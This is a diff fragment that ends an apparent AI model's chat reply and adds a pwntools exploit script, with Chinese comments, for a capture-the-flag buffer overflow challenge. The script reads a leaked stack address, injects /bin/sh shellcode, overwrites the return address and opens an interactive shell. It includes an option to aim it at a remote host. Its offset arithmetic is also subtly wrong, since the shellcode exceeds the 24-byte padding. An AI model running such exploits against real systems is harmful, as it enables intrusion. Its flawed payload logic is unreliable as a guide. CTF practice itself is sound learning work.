@@ -141,3 +141,60 @@ AIMessage(content='To solve this challenge using pwntools, we\'ll write a Python
  'ASLR, NX, or stack canaries.\n'
  '\n'
  'Feel free to ask if you have any questions or need further assistance!')
+
+from pwn import *
+
+# 设置pwntools上下文
+context(os='linux', arch='amd64')  # 根据目标二进制文件调整操作系统和架构
+context.log_level = 'debug'  # 设置为'info'或'error'以减少输出冗长度
+
+# 替换 './chall' 为目标二进制文件的实际路径
+binary = './chall'
+elf = ELF(binary)
+
+# 对于本地执行
+p = process(binary)
+
+# 如果挑战是远程的，请取消注释并设置正确的主机和端口
+# host = 'example.com'
+# port = 1337
+# p = remote(host, port)
+
+# 接收初始输出
+p.recvline()  # 欢迎信息
+
+# 接收包含缓冲区地址的行
+line = p.recvline()
+print(line)
+
+# 提取程序打印的缓冲区地址
+# 预期格式: "What is it : [0x7fffffffe550] ?"
+address_line = line.decode().strip()
+buf_address_str = address_line.split('[')[1].split(']')[0]
+buf_address = int(buf_address_str, 16)
+
+log.info(f"Buffer address: {hex(buf_address)}")
+
+# 接收提示
+p.recvline()  # "Input something :"
+
+# 构造shellcode
+# 使用64位shellcode启动/bin/sh
+shellcode = asm(shellcraft.sh())
+
+# 计算覆盖返回地址的偏移量
+# 缓冲区为16字节，保存的RBP为8字节，在返回地址之前
+offset = 16 + 8  # 总共24字节到达返回地址
+
+# 构建有效载荷
+payload = shellcode.ljust(offset, b'\x90')  # 用NOP填充到偏移量
+payload += p64(buf_address)  # 覆盖返回地址为缓冲区地址
+
+# 确保有效载荷长度不超过缓冲区限制
+assert len(payload) <= 0x400, "Payload is too large!"
+
+# 发送有效载荷
+p.send(payload)
+
+# 切换到交互模式与shell互动
+p.interactive()
